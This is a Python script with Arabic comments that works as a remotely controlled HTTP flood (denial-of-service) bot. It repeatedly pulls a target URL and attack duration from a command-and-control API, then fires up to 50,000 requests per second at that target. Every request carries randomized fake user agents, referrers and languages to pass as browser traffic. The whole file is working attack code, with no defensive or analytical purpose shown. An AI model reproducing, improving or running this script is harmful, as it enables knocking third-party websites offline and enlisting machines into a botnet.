import aiohttp
import asyncio
import time
import xml.etree.ElementTree as ET
from fake_useragent import UserAgent
import random

MAX_REQUESTS_PER_SECOND = 50000

# قائمة بالـ Referers الحقيقية التي يمكن استخدامها
referrers = [
    "https://www.google.com/",
    "https://www.facebook.com/",
    "https://www.twitter.com/",
    "https://www.instagram.com/",
    "https://www.linkedin.com/",
    "https://www.reddit.com/",
    "https://www.wikipedia.org/",
    "https://www.amazon.com/",
    "https://www.youtube.com/"
]

# إنشاء وكيل مستخدم عشوائي باستخدام fake_useragent
ua = UserAgent()

# دالة إرسال الطلبات
async def send_request(session, url):
    # توليد وكيل مستخدم عشوائي
    user_agent = ua.random
    referrer = random.choice(referrers)  # اختيار referrer عشوائي من القائمة
    headers = {
        'User-Agent': user_agent,
        'Referer': referrer,  # استخدام referrer عشوائي
        'Accept-Language': random.choice(['en-US', 'en-GB', 'fr-FR', 'de-DE', 'ar-SA']),  # اختيار لغة عشوائية
        'Accept-Encoding': 'gzip, deflate, br',  # الترميزات المقبولة
        'Connection': 'keep-alive',  # الاتصال المستمر لتقليد المتصفح
    }

    try:
        async with session.get(url, headers=headers):
            pass
    except Exception as e:
        pass

# دالة جلب التعليمات من الـ API
async def get_instructions():
    api_url = 'http://nrcf.medianewsonline.com/api/index.php'
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url) as response:
                if response.status == 200:
                    xml_data = await response.text()
                    if xml_data:
                        try:
                            root = ET.fromstring(xml_data)
                            url = root.find('url').text
                            time_limit = int(root.find('time').text)
                            return url, time_limit
                        except ET.ParseError as e:
                            return None, None
                    else:
                        return None, None
                else:
                    return None, None
    except Exception as e:
        return None, None

# دالة إرسال الطلبات دفعة واحدة
async def send_requests_in_batch(url, duration):
    async with aiohttp.ClientSession() as session:
        start_time = time.time()
        end_time = start_time + duration

        while time.time() < end_time:
            tasks = [send_request(session, url) for _ in range(MAX_REQUESTS_PER_SECOND)]
            await asyncio.gather(*tasks)

            elapsed_time = time.time() - start_time
            requests_per_second = MAX_REQUESTS_PER_SECOND / elapsed_time

            if elapsed_time < 1:
                await asyncio.sleep(1 - elapsed_time)

# دالة الرئيسية
async def main():
    while True:
        url, duration = await get_instructions()

        if url and duration:
            await send_requests_in_batch(url, duration)
        else:
            await asyncio.sleep(10)

if __name__ == "__main__":
    asyncio.run(main())
